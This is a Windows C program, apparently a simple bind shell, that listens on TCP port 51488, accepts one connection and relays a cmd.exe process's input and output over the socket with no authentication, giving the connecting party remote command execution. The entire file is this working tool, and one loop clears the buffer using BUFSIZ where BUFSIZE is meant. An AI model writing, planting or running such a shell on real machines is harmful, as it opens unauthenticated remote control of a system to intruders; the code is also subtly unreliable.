#define WIN32_LEAN_AND_MEAN
#undef UTF8

#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>
#include <tchar.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define BUFSIZE 512
#define DEFAULT_PORT "51488"
#define EOK 0

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

HANDLE g_hInputFile = NULL;

SOCKET ListenSocket = INVALID_SOCKET;
SOCKET ClientSocket = INVALID_SOCKET;

void CreateChildProcess(void);
DWORD WINAPI WriteToPipe(LPDWORD);
DWORD WINAPI ReadFromPipe(LPDWORD);
void ErrorExit(PTSTR);

DWORD main(void) {
  WSADATA wsaData;
  DWORD iResult, iSendResult;

  struct addrinfo *result = NULL;
  struct addrinfo hints;

  // Initialize Winsock
  iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (iResult != 0) {
    printf("WSAStartup failed with error: %d\n", iResult);
    return 1;
  }

  ZeroMemory(&hints, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  hints.ai_flags = AI_PASSIVE;

  // Resolve the server address and port
  iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
  if (iResult != 0) {
    printf("getaddrinfo failed with error: %d\n", iResult);
    WSACleanup();
    return 1;
  }

  // Create a SOCKET for the server to listen for client connections.
  ListenSocket =
      socket(result->ai_family, result->ai_socktype, result->ai_protocol);
  if (ListenSocket == INVALID_SOCKET) {
    printf("socket failed with error: %ld\n", WSAGetLastError());
    freeaddrinfo(result);
    WSACleanup();
    return 1;
  }

  // Setup the TCP listening socket
  iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
  if (iResult == SOCKET_ERROR) {
    printf("bind failed with error: %d\n", WSAGetLastError());
    freeaddrinfo(result);
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  freeaddrinfo(result);

  iResult = listen(ListenSocket, SOMAXCONN);
  if (iResult == SOCKET_ERROR) {
    printf("listen failed with error: %d\n", WSAGetLastError());
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  // Accept a client socket
  ClientSocket = accept(ListenSocket, NULL, NULL);
  if (ClientSocket == INVALID_SOCKET) {
    printf("accept failed with error: %d\n", WSAGetLastError());
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  // No longer need server socket
  closesocket(ListenSocket);

  SECURITY_ATTRIBUTES saAttr;

  saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
  saAttr.bInheritHandle = TRUE;
  saAttr.lpSecurityDescriptor = NULL;

  if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
    ErrorExit(TEXT("StdoutRd CreatePipe"));

  if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    ErrorExit(TEXT("Stdout SetHandleInformation"));

  if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
    ErrorExit(TEXT("Stdin CreatePipe"));

  if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
    ErrorExit(TEXT("Stdin SetHandleInformation"));

  CreateChildProcess();

  HANDLE threads[2];
  threads[0] = CreateThread(NULL, 0, WriteToPipe, NULL, 0, NULL);
  threads[1] = CreateThread(NULL, 0, ReadFromPipe, NULL, 0, NULL);

  WaitForMultipleObjects(2, threads, TRUE, INFINITE);

  for (int i = 0; i < 2; ++i)
    CloseHandle(threads[i]);

  // shutdown the connection since we're done
  iResult = shutdown(ClientSocket, SD_SEND);
  if (iResult == SOCKET_ERROR) {
    printf("shutdown failed with error: %d\n", WSAGetLastError());
    closesocket(ClientSocket);
    WSACleanup();
    return 1;
  }

  // cleanup
  closesocket(ClientSocket);
  WSACleanup();

  return EOK;
}

void CreateChildProcess() {
  // Create a child process that uses the previously created pipes for STDIN and
  // STDOUT.
  TCHAR szCmdline[] = TEXT("\\\\?\\C:\\Windows\\System32\\cmd.exe");
  PROCESS_INFORMATION piProcInfo;
  STARTUPINFO siStartInfo;
  BOOL bSuccess = FALSE;

  // Set up members of the PROCESS_INFORMATION structure.
  ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

  // Set up members of the STARTUPINFO structure.
  // This structure specifies the STDIN and STDOUT handles for redirection.
  ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
  siStartInfo.cb = sizeof(STARTUPINFO);
  siStartInfo.hStdError = g_hChildStd_OUT_Wr;
  siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
  siStartInfo.hStdInput = g_hChildStd_IN_Rd;
  siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

  // Create the child process.
  bSuccess = CreateProcess(NULL,
                           szCmdline,    // command line
                           NULL,         // process security attributes
                           NULL,         // primary thread security attributes
                           TRUE,         // handles are inherited
                           0,            // creation flags
                           NULL,         // use parent's environment
                           NULL,         // use parent's current directory
                           &siStartInfo, // STARTUPINFO pointer
                           &piProcInfo); // receives PROCESS_INFORMATION

  // If an error occurs, exit the application.
  if (!bSuccess)
    ErrorExit(TEXT("CreateProcess"));
  else {
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

    CloseHandle(g_hChildStd_OUT_Wr);
    CloseHandle(g_hChildStd_IN_Rd);
  }
}

DWORD WINAPI WriteToPipe(LPDWORD dummy) {
  UNREFERENCED_PARAMETER(dummy);
  DWORD dwWritten, iResult;
  BOOL bSuccess = FALSE;
  CHAR chBuf[BUFSIZE];

  for (;;) {
    printf("Write Begin\n");

    for (int i = 0; i < BUFSIZ; ++i)
      chBuf[i] = 0;

    printf("Trying to recv\n");
    iResult = recv(ClientSocket, chBuf, BUFSIZE, 0);
    if (iResult > 0) {
      bSuccess =
          WriteFile(g_hChildStd_IN_Wr, chBuf, strlen(chBuf), &dwWritten, NULL);
      if (!bSuccess)
        break;
    } else if (iResult == 0)
      printf("Connection closing...\n");
    else {
      printf("recv failed with error: %d\n", WSAGetLastError());
      closesocket(ClientSocket);
      WSACleanup();
      break;
    }
    if (!strcmp(chBuf, "exit\n"))
      break;
  }
  return EOK;
}

DWORD WINAPI ReadFromPipe(LPDWORD dummy) {
  UNREFERENCED_PARAMETER(dummy);
  DWORD dwRead, dwWritten, iSendResult;
  CHAR chBuf[BUFSIZE];
  BOOL bSuccess = FALSE;

  for (;;) {
    printf("Read Begin\n");
    for (int i = 0; i < BUFSIZE; ++i)
      chBuf[i] = 0;
    bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
    if (!bSuccess || dwRead == 0)
      break;
    printf("Trying to send\n");
    iSendResult = send(ClientSocket, chBuf, dwRead, 0);
    if (iSendResult == SOCKET_ERROR) {
      printf("send failed with error: %d\n", WSAGetLastError());
      closesocket(ClientSocket);
      WSACleanup();
      break;
    }
    if (!strcmp(chBuf, "exit\n"))
      break;
  }
  return EOK;
}

void ErrorExit(PTSTR lpszFunction) {
  LPVOID lpMsgBuf;
  LPVOID lpDisplayBuf;
  DWORD dw = GetLastError();

  FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
                    FORMAT_MESSAGE_IGNORE_INSERTS,
                NULL, dw, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                (LPTSTR)&lpMsgBuf, 0, NULL);

  lpDisplayBuf =
      (LPVOID)LocalAlloc(LMEM_ZEROINIT, (lstrlen((LPCTSTR)lpMsgBuf) +
                                         lstrlen((LPCTSTR)lpszFunction) + 40) *
                                            sizeof(TCHAR));
  StringCchPrintf((LPTSTR)lpDisplayBuf, LocalSize(lpDisplayBuf) / sizeof(TCHAR),
                  TEXT("%s failed with error %d: %s"), lpszFunction, dw,
                  lpMsgBuf);
  MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

  LocalFree(lpMsgBuf);
  LocalFree(lpDisplayBuf);
  ExitProcess(1);
}